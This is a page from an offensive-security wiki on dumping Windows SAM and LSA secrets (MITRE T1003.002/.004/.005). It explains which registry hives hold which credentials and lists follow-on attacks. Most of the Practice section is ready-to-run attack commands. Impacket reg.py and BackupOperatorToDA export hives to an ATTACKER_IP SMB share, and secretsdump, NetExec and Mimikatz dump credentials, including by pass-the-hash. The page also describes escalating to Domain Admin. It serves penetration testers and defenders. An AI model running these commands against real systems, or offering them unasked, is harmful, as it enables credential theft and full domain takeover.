---
description: 'MITRE ATT&CK™ Sub-techniques T1003.002, T1003.004 and T1003.005'
authors: 'ShutdownRepo, mpgn, p0dalirius, sckdev'
category: ad
---

# SAM & LSA secrets

## Theory

In Windows environments, passwords are stored in a hashed format in registry hives like SAM (Security Account Manager) and SECURITY.

| Hive | Details | Format or credential material |
| -------- | -------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SAM | stores locally cached credentials (referred to as SAM secrets) | LM or NT hashes |
| SECURITY | stores domain cached credentials (referred to as LSA secrets) | Plaintext passwords, LM or NT hashes, Kerberos keys (DES, AES), Domain Cached Credentials (DCC1 and DCC2), Security Questions (`L$`*`SQSA`*`<SID>`),  |
| SYSTEM | contains enough info to decrypt SAM secrets and LSA secrets | N/A |

SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives. Once the secrets are extracted, they can be used for various attacks, depending on the credential format.

| Credential material | Subsequent attacks |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Plaintext passwords | [credential spraying](../bruteforcing/spraying), [stuffing](../bruteforcing/stuffing.md), [shuffling](../shuffling.md) or [silver tickets](../../kerberos/forged-tickets/) |
| LM and NT hashes | [credential spraying](../bruteforcing/spraying), [stuffing](../bruteforcing/stuffing.md), [shuffling](../shuffling.md), [cracking](../cracking.md), [pass-the-hash](../../ntlm/pth.md) |
| Kerberos keys (RC4, i.e. == NT hash) | [credential cracking](../cracking.md), [overpass-the-hash](../../kerberos/ptk.md) or [silver tickets](../../kerberos/forged-tickets/) |
| Kerberos keys (DES, AES) | [credential cracking](../cracking.md), [pass-the-key](../../kerberos/ptk.md) or [silver tickets](../../kerberos/forged-tickets/) |
| Domain Cached Credentials (DCC1 or DCC2) | [credential cracking](../cracking.md) |

## Practice

### Exfiltration

::: tabs

=== UNIX-like

[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../builtins/security-groups) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md).

> [!TIP]
> The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.

```bash
# start an SMB share
smbserver.py -smb2support "someshare" "./"

# save each hive manually
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'

# backup all SAM, SYSTEM and SECURITY hives at once
reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
```


=== Live Windows

When the Windows operating system is running, the hives are in use and mounted. The command-line tool named `reg` can be used to export them.

```bash
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

This operation can be conducted remotely with [BackupOperatoToDA](https://github.com/mpgn/BackupOperatorToDA) (C++).

> [!TIP]
> The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.

```bash
BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATTACKER_IP\someshare"
```

> [!TIP]
> Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](ntds.md#volume-shadow-copy-vssadmin) like demonstrated for an NTDS export.


=== Down Windows

When Windows is not running, the hives are not mounted and they can be copied just like any other file. This can be operated when mounting the hard drive from another OS (e.g. when booting the computer on another operating system). The hive files can be found at the following locations.

```bash
\system32\config\sam
\system32\config\security
\system32\config\system
```

:::


### Secrets dump

Here are some examples and tools that can be used for local/remote/offline dumping.

::: tabs

=== secretsdump

[Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../ntlm/pth.md) (LM/NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos).

```bash
# Remote dumping of SAM & LSA secrets
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'

# Remote dumping of SAM & LSA secrets (pass-the-hash)
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'

# Remote dumping of SAM & LSA secrets (pass-the-ticket)
secretsdump.py -k 'DOMAIN/USER@TARGET'

# Offline dumping of LSA secrets from exported hives
secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL

# Offline dumping of SAM secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL

# Offline dumping of SAM & LSA secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```


=== netexec

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos)

```bash
# Remote dumping of SAM/LSA secrets
netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa

# Remote dumping of SAM/LSA secrets (local user authentication)
netexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa

# Remote dumping of SAM/LSA secrets (pass-the-hash)
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa

# Remote dumping of SAM/LSA secrets (pass-the-ticket)
netexec smb $TARGETS --kerberos --sam/--lsa
```


=== Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally with [`lsadump::sam`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/sam) and [`lsadump::secrets`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/secrets) to extract credentials from `SAM` and `SECURITY` registry hives (and `SYSTEM` for the encryption keys), or offline with hive dumps.

```bash
# Local dumping of SAM secrets on the target
lsadump::sam

# Offline dumping of SAM secrets from exported hives
lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'

# Local dumping of LSA secrets on the target
lsadump::secrets

# Offline dumping LSA secrets from exported hives
lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
```

:::

> [!TIP]
> Secretsdump (Impacket) and NetExec both extract security questions, if any, from the LSA. They are json formatted, UTF-16-LE encoded, and hex encoded on top of that.

## Resources

[http://moyix.blogspot.com/2008/02/syskey-and-sam.html](http://moyix.blogspot.com/2008/02/syskey-and-sam.html)

[http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html](http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html)

[https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)

[https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/](https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/)
